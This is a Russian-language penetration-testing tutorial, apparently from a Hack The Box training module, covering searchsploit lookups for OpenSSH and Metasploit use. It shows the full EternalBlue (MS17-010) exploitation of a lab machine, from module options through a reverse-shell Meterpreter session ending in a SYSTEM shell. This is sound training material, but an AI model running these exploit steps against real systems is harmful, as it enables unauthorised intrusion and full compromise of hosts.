# Public Exploits

Как только мы идентифицируем службы, работающие на портах, определенных в результате сканирования Nmap, первым делом нужно проверить, есть ли в каком-либо из приложений / служб какие-либо открытые эксплойты. Общедоступные эксплойты можно найти для веб-приложений и других приложений, работающих на открытых портах, таких как SSH или ftp.

## Finding Public Exploits

Многие инструменты могут помочь нам в поиске общедоступных эксплойтов для различных приложений и служб, с которыми мы можем столкнуться на этапе перечисления. Один из способов - это запросить в Google имя приложения с эксплойтом, чтобы узнать, получим ли мы какие-либо результаты:

![](../../.gitbook/assets/image%20%285%29.png)

Хорошо известным инструментом для этой цели является searchsploit, который мы можем использовать для поиска общедоступных уязвимостей / эксплойтов для любого приложения. Мы можем установить его с помощью следующей команды:

```bash
spike@htb[/htb]$ sudo apt install exploitdb -y
```

Затем мы можем использовать searchsploit для поиска конкретного приложения по его имени, как показано ниже:

```bash
spike@htb[/htb]$ searchsploit openssh 7.2

----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                     | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                               | linux/remote/45210.py
OpenSSH 7.2 - Denial of Service                                                                                              | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                      | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                                                         | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                         | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                     | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                         | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                                                                        | linux/remote/40113.txt
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Мы также можем использовать онлайн-базы данных эксплойтов для поиска уязвимостей, таких как [Exploit DB](https://www.exploit-db.com/), [Rapid7 DB](https://www.rapid7.com/db/) или [Vulnerability Lab](https://www.vulnerability-lab.com/). В модуле «Введение в веб-приложения» обсуждаются общедоступные уязвимости веб-приложений.

## Metasploit Primer

Metasploit Framework \(MSF\) - отличный инструмент для пентестеров. Он содержит множество встроенных эксплойтов для многих общедоступных уязвимостей и предоставляет простой способ использовать эти эксплойты против уязвимых целей. MSF имеет много других функций, например:

* Запуск сценариев разведки для перечисления удаленных хостов и скомпрометированных целей
* Проверочные скрипты для проверки наличия уязвимости фактически не ставя под угрозу цели.
* Meterpreter - отличный инструмент для подключения к оболочкам и выполнения команд на скомпрометированных целях.
* Множество инструментов для постэксплуатации и разворота

Давайте рассмотрим базовый пример поиска эксплойта для приложения, которое мы атакуем, и того, как его использовать. Чтобы запустить Metasploit, мы можем использовать команду msfconsole:

```bash
spike@htb[/htb]$ msfconsole


      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.0.16-dev                          ]
+ -- --=[ 2074 exploits - 1124 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]
```

После запуска Metasploit мы можем искать наше целевое приложение с помощью команды search exploit. Например, мы можем найти уязвимость SMB, которую мы идентифицировали ранее:

```bash
msf6 > search exploit eternalblue

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
<SNIP>
EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 
```

{% hint style="info" %}
Поиск может применять сложные фильтры, такие как search cve: 2009 type: exploit. Просмотреть все фильтры с помощью поиска.
{% endhint %}

Мы нашли один эксплойт для этого сервиса. Мы можем использовать его, скопировав полное имя и используя USE:

```bash
msf6 > use exploit/windows/smb/ms17_010_psexec

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

Прежде чем мы сможем запустить эксплойт, нам нужно настроить его параметры. Чтобы просмотреть параметры, доступные для настройки, мы можем использовать команду show options:

```bash
Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445                                                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBUser                                                                               no        The username to authenticate as

...SNIP...
```

Для работы эксплойта необходимо установить любой параметр с параметром Required, установленным на yes. В этом случае нам нужно установить только параметры: RHOSTS, что означает IP-адрес нашей цели \(это может быть один IP-адрес, несколько IP-адресов или файл, содержащий список IP-адресов\). Мы можем установить их с помощью команды set:

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0
```

Как только у нас будут установлены обе опции, мы можем начать эксплуатацию. Однако перед запуском скрипта мы можем запустить проверку, чтобы убедиться, что сервер уязвим:

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > check

[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
```

Как видим, сервер действительно уязвим. Обратите внимание, что не каждый эксплойт в Metasploit Framework поддерживает функцию проверки. Наконец, мы можем использовать команду run или exploit для запуска эксплойта:

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 10.10.10.40:445 - Built a write-what-where primitive...
[+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.40:445 - Selecting PowerShell target
[*] 10.10.10.40:445 - Executing the payload...
[+] 10.10.10.40:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.40:49159) at 2020-12-27 01:13:28 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 39640 created.
Channel 0 created.
Windows 7 Professional 7601 Service Pack 1
(C) Copyright 1985-2009 Microsoft Corp.

C:\WINDOWS\system32>whoami
NT AUTHORITY\SYSTEM
```

Как мы видим, мы смогли получить доступ администратора к ящику и использовали команду оболочки, чтобы перетащить нас в интерактивную оболочку. Это основные примеры использования Metasploit для эксплуатации уязвимости на удаленном сервере. На платформе Hack The Box есть много устаревших боксов, которые отлично подходят для практики Metasploit. Некоторые из них включают, но не ограничиваются:

* Granny/Grandpa
* Jerry
* Blue
* Lame
* Optimum
* Legacy
* Devel

Позже, в этом модуле, мы шаг за шагом рассмотрим окно Nibbles, а затем покажем использование Metasploit. Metasploit - еще один важный инструмент, который нужно добавить в наш инструментарий, но важно не только полагаться на него. Чтобы быть всесторонними тестировщиками, мы должны знать, как наилучшим образом использовать все доступные нам инструменты, понимать, почему они иногда терпят неудачу, и знать, когда перейти к ручным методам или другим инструментам.

